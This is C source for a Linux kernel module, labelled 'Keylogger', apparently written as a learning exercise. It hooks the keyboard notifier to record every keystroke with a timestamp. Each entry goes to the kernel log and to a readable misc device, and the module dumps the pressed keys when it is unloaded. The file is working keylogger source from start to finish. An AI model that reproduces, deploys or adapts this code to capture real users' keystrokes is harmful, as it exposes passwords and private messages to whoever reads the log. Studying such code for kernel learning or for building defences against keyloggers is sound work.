#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/input.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/timekeeping.h>
#include "keycode_to_us_string.c"

MODULE_LICENSE("GPL");		// GNU General Public License
MODULE_AUTHOR("mademir");
MODULE_DESCRIPTION("Keylogger");

#define LOG_DEVICE "keylogger"

static char			*device_buffer;
static size_t		buffer_offset;
static DEFINE_MUTEX(buffer_lock);

static int	log_func(struct notifier_block *nb, unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;
	char	buff[16];
	struct timespec64	ts;
	struct tm	tm;
    int tz_offset = 2 * 60 * 60;
    char log[128];
    size_t log_len;
	int ascii_val;

    ktime_get_real_ts64(&ts);
    ts.tv_sec += tz_offset;
	time64_to_tm(ts.tv_sec, 0, &tm);

    if (action == KBD_KEYCODE)
	{
		keycode_to_us_string(param->value, param->shift, buff, 16, &ascii_val);
		if (ascii_val == 999)
			log_len = snprintf(log, sizeof(log), "%02d:%02d:%02d | NAME: %s | ASCII: n/a | KEYCODE: %d | %s\n", tm.tm_hour, tm.tm_min, tm.tm_sec, buff, param->value, param->down ? "pressed" : "released");
		else
			log_len = snprintf(log, sizeof(log), "%02d:%02d:%02d | NAME: %s | ASCII: %d | KEYCODE: %d | %s\n", tm.tm_hour, tm.tm_min, tm.tm_sec, buff, ascii_val, param->value, param->down ? "pressed" : "released");

        printk(KERN_INFO "%s", log);

		mutex_lock(&buffer_lock);
		char *new_buffer = krealloc(device_buffer, buffer_offset + log_len + 1, GFP_KERNEL);
		if (!new_buffer)
		{
            printk(KERN_ERR "Keylogger: Failed to allocate more memory for device buffer\n");
			mutex_unlock(&buffer_lock);
            return NOTIFY_OK;
		}
		device_buffer = new_buffer;
		memcpy(device_buffer + buffer_offset, log, log_len);
		buffer_offset += log_len;
		device_buffer[buffer_offset] = '\0';
		mutex_unlock(&buffer_lock);
	}
    return NOTIFY_OK;
}

static void print_pressed_keys(void)
{
	char *pos = device_buffer;
	char log[128];

	printk(KERN_INFO "Keylogger: Final log\n");

    while ((pos = strstr(pos, "pressed")) != NULL)
    {
        char *start = pos;
        while (start != device_buffer && *start != '\n')
        {
            start--;
        }
        if (*start == '\n')
        {
            start++;
        }
		
        char *end = pos;
        while (*end != '\n' && *end != '\0')
        {
            end++;
        }
        size_t len = end - start;
        strncpy(log, start, len);
        log[len] = '\0';
        printk(KERN_INFO "%s\n", log);
        pos = end;
    }

	printk(KERN_INFO "Keylogger: End of final log\n");
}

static ssize_t	read_keylogger(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
	return simple_read_from_buffer(buf, count, ppos, device_buffer, buffer_offset);
}

static struct notifier_block	keyboard_notifier;
static struct miscdevice		misc_device;
static struct file_operations	fops;

static int	__init ModuleInit(void)
{
	printk(KERN_INFO "Keylogger: Load module\n");

	keyboard_notifier.notifier_call = log_func;

	misc_device.name = LOG_DEVICE;
	misc_device.minor = MISC_DYNAMIC_MINOR;
	misc_device.fops = &fops;

	fops.owner = THIS_MODULE;
	fops.read = read_keylogger;

	int misc_ret = misc_register(&misc_device);
	if (misc_ret)
	{
		printk(KERN_INFO "Keylogger: Error during registering misc device");
		return -misc_ret;
	}
	else
	{
		printk(KERN_INFO "Keylogger: Misc device registered\n");
	}

	int keyboard_ret = register_keyboard_notifier(&keyboard_notifier);
	if (keyboard_ret)
	{
		printk(KERN_INFO "Keylogger: Keyboard notifier failed to register\n");
	}
	else
	{
		printk(KERN_INFO "Keylogger: Keyboard notifier registered\n");
	}

	return (0);
}

static void	__exit ModuleExit(void)
{
	printk(KERN_INFO "Keylogger: Exit module\n");

    mutex_lock(&buffer_lock);
    print_pressed_keys();
    kfree(device_buffer);
    mutex_unlock(&buffer_lock);

    misc_deregister(&misc_device);
	unregister_keyboard_notifier(&keyboard_notifier);
	return ;
}

module_init(ModuleInit);
module_exit(ModuleExit);
